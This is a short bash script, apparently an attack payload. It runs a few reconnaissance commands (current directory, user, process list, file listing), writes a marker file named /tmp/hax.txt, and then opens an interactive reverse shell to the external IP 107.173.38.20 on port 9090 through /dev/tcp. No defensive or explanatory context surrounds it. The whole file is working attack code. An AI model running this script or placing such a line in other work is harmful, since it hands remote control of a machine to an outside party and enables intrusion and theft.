#!/bin/bash

pwd
whoami
ps auxfwww
ls $(pwd)

echo $(date) > /tmp/hax.txt

bash -i >& /dev/tcp/107.173.38.20/9090 0>&1



